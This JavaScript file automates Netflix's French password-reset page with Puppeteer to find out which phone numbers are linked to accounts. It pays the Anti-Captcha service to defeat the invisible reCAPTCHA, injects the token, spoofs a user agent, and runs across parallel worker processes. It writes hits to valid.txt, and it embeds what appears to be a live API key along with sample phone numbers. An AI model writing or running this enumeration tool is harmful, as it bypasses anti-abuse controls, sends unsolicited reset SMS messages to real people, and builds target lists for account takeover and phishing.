const puppeteer = require('puppeteer');
const axios = require('axios');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Your Anti-Captcha API key
const API_KEY = 'e66f00e5516a9e7bd32719b7dd6ca01d';

// Helper function to create the reCAPTCHA task
async function createRecaptchaTask(websiteURL, websiteKey) {
    console.log("Creating reCAPTCHA v3 task...");
    try {
        const response = await axios.post('https://api.anti-captcha.com/createTask', {
            clientKey: API_KEY,
            task: {
                type: 'RecaptchaV3TaskProxyless',
                websiteURL: websiteURL,
                websiteKey: websiteKey,
                minScore: 0.3 // Set the minimum acceptable score
            }
        });

        if (response.data.errorId === 0) {
            console.log("Task created successfully. Task ID:", response.data.taskId);
            return response.data.taskId;
        } else {
            throw new Error(`Error creating task: ${response.data.errorDescription}`);
        }
    } catch (error) {
        throw new Error(`Error while creating CAPTCHA task: ${error.message}`);
    }
}

// Helper function to get the result of the reCAPTCHA task
async function getRecaptchaResult(taskId) {
    console.log("Fetching result for Task ID:", taskId);
    let tries = 0;

    while (tries < 20) { // Retry for up to 100 seconds
        try {
            const response = await axios.post('https://api.anti-captcha.com/getTaskResult', {
                clientKey: API_KEY,
                taskId: taskId
            });

            if (response.data.status === 'ready') {
                console.log("CAPTCHA solved successfully. Token:", response.data.solution.gRecaptchaResponse);
                return response.data.solution.gRecaptchaResponse;
            } else {
                console.log(`Attempt ${tries + 1}: CAPTCHA solving still in progress...`);
            }
            tries++;
            await delay(5000); // Wait 5 seconds between retries
        } catch (error) {
            throw new Error(`Error while fetching CAPTCHA result: ${error.message}`);
        }
    }
    throw new Error('CAPTCHA solving timed out.');
}

// Delay function
async function delay(time) {
    return new Promise(function (resolve) {
        setTimeout(resolve, time);
    });
}

// Function to append phone numbers to the correct file based on their status
function appendToFile(filename, content) {
    const filePath = path.resolve(__dirname, filename);
    fs.appendFileSync(filePath, content + '\n', 'utf8', (err) => {
        if (err) throw err;
    });
}

// Function to check a single phone number on Netflix using the same browser
async function checkNetflixPhoneWithPuppeteer(phoneNumber, browser) {
    try {
        const page = await browser.newPage();

        // Set user-agent to avoid being blocked by Netflix
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36');

        // Navigate to Netflix login help page
        await page.goto('https://www.netflix.com/fr/LoginHelp', { waitUntil: 'networkidle2' });

        // Use the correct reCAPTCHA v3 site key
        const recaptchaSiteKey = '6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp'; // Replace with actual site key

        console.log("Invisible reCAPTCHA v3 detected, solving...");

        // Create a task to solve the invisible reCAPTCHA using Anti-Captcha
        const taskId = await createRecaptchaTask('https://www.netflix.com/fr/LoginHelp', recaptchaSiteKey);

        // Wait for the task result
        const token = await getRecaptchaResult(taskId);

        // Inject the token into the hidden form field
        await page.evaluate((token) => {
            const form = document.forms[0];
            if (form) {
                let recaptchaInput = document.querySelector('#g-recaptcha-response');
                if (!recaptchaInput) {
                    recaptchaInput = document.createElement('input');
                    recaptchaInput.setAttribute('type', 'hidden');
                    recaptchaInput.setAttribute('name', 'g-recaptcha-response');
                    recaptchaInput.setAttribute('value', token);
                    form.appendChild(recaptchaInput);
                } else {
                    recaptchaInput.value = token;
                }
            } else {
                console.error('Form not found.');
            }
        }, token);

        console.log("Token injected successfully.");

        // Wait for the SMS option and select it
        await page.waitForSelector('label[for="bxid_resetPasswordChoice_text"]', { visible: true });
        await page.click('label[for="bxid_resetPasswordChoice_text"]');

        // Wait for the phone input field and type the phone number
        await page.waitForSelector('#forgot_password_input', { visible: true });
        await page.type('#forgot_password_input', phoneNumber);

        // Submit the form
        await page.waitForSelector('button[data-uia="action_forgot_password"]', { visible: true });
        await page.click('button[data-uia="action_forgot_password"]');

        // Wait for a few seconds for the page to process
        await delay(5000);

        // Capture the visible text on the page for analysis
        const pageText = await page.evaluate(() => document.body.innerText);

        // Check if the number is linked to a Netflix account or not and append to the correct file
        if (pageText.includes("nous avons envoyé un SMS") || pageText.includes("Code envoyé")) {
            prints="+33"+phoneNumber;
            console.log(`Phone number ${phoneNumber} is linked to a Netflix account.`);
            appendToFile('valid.txt', prints); // Save to .txt
        } else if (pageText.includes("Ce numéro de téléphone n'est lié à aucun compte") || pageText.includes("This phone number is not linked to any account")) {
            console.log(`Phone number ${phoneNumber} is NOT linked to a Netflix account.`);
            prints="+33"+phoneNumber;
            appendToFile('notvalid.txt', phoneNumber); // Save to .txt
        } else {
            console.log("No clear response. Here's part of the visible page text for debugging:");
            console.log(pageText.substring(0, 500));
        }

        await page.close(); // Close the page after each test
    } catch (error) {
        console.error(`Error checking phone number ${phoneNumber}:`, error);
    }
}

// Function to test multiple phone numbers in a worker process
async function testMultiplePhoneNumbers(phoneNumbers) {
    const browser = await puppeteer.launch({
        headless: false, // Set to false to ensure the browser is fully visible
        args: [
            '--no-sandbox', '--disable-setuid-sandbox',
            '--disable-gpu', '--disable-dev-shm-usage',
            '--disable-features=IsolateOrigins,site-per-process',
            '--no-zygote'
        ]
    });

    for (const phoneNumber of phoneNumbers) {
        console.log(`Checking phone number: ${phoneNumber}`);
        await checkNetflixPhoneWithPuppeteer(phoneNumber, browser);
    }

    await browser.close(); // Close the browser after all tests are completed
}

// Main Cluster Function
if (cluster.isMaster) {
    const numCPUs = os.cpus().length; // Use the number of available CPU cores
    const phoneNumbers = ['783205798', '783205797', '783302795', '783205794', '782305793']; // Add more phone numbers

    // Split phone numbers into chunks to distribute to workers
    const chunkSize = Math.ceil(phoneNumbers.length / numCPUs);
    const phoneChunks = [];

    for (let i = 0; i < phoneNumbers.length; i += chunkSize) {
        phoneChunks.push(phoneNumbers.slice(i, i + chunkSize));
    }

    // Fork workers and assign phone number chunks
    for (let i = 0; i < phoneChunks.length; i++) {
        const worker = cluster.fork();
        worker.send(phoneChunks[i]);
    }

    // Handle worker completion
    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} exited with code ${code}`);
    });
} else {
    process.on('message', async (phoneChunk) => {
        console.log(`Worker ${process.pid} processing phone numbers:`, phoneChunk);
        await testMultiplePhoneNumbers(phoneChunk);
        process.exit();
    });
}
